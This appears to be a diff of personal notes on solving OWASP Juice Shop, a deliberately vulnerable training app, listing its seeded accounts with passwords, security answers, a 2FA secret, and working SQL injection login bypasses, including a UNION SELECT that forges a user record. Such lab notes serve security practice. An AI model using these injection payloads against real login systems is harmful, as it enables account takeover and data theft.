@@ -4,7 +4,10 @@ Users Data in Juice-Shop and Others
 
 
 admin@juice-sh.op
+
 Password = admin123
+
+
 {
   "status": "success",
   "data": {
@@ -30,7 +33,9 @@ Password = admin123
 
 
 mc.safesearch@juice-sh.op
+
 Password = Mr. N00dles
+
 {
   "status": "success",
   "data": {
@@ -56,6 +61,7 @@ Password = Mr. N00dles
 
 
 amy@juice-sh.op
+
 Password = K1f.....................
 
 {
@@ -83,11 +89,17 @@ Password = K1f.....................
 
 
 bjoern.kimminich@gmail.com
+
 but you can use  this email too  => bjoern@owasp.org
+
 Password = bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=
+
 Security answer = Zaya
-bjoern@juice-sh.op 
+
+bjoern@juice-sh.op
+
 Security answer = West-2082 
+
 Zip = 25436 => West-2082 
 
 {
@@ -116,7 +128,9 @@ Zip = 25436 => West-2082
 
 
 jim@juice-sh.op
+
 Password = ncc-1701
+
 Security Questiob = Samuel
 
 {
@@ -145,8 +159,11 @@ Security Questiob = Samuel
 
 
 bender@juice-sh.op
+
 Password = Stop'n'Drop
+
 You can use for enter = ' or 1=1 and email like('%bender%');--
+
 {
   "status": "success",
   "data": {
@@ -172,12 +189,14 @@ You can use for enter = ' or 1=1 and email like('%bender%');--
 ******************************************
 
 chris.pike@juice-sh.op
+
 Enter for = chris.pike@juice-sh.op'--
 
 ******************************************
 
 
 uvogin@juice-sh.op
+
 security answer = Silence of the Lambs
 
 {
@@ -206,12 +225,14 @@ security answer = Silence of the Lambs
 ********************************************
 
 morty@juice-sh.op
+
 Security answer = Snowball => 5N0wb41L
 
 ********************************************
 
 
 acc0unt4nt@juice-sh.op
+
 SQL ınjection is = ' UNION SELECT * FROM (SELECT 15 as 'id', '' as 'username', 'acc0unt4nt@juice-sh.op' as 'email', '12345' as 'password', 'accounting' as 'role', '123' as 'deluxeToken', '1.2.3.4' as 'lastLoginIp' , '/assets/public/images/uploads/default.svg' as 'profileImage', '' as 'totpSecret', 1 as 'isActive', '2020-08-16 14:14:41.644 +00:00' as 'createdAt', '2020-08-16 14:33:41.930 +00:00' as 'updatedAt', null as 'deletedAt')--
 
 "data": {
@@ -236,4 +257,5 @@ SQL ınjection is = ' UNION SELECT * FROM (SELECT 15 as 'id', '' as 'username', 
 ***********************************************
 
 wurstbrot@juice-sh.op
+
 2FA Token = IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH => generate with authenticator.
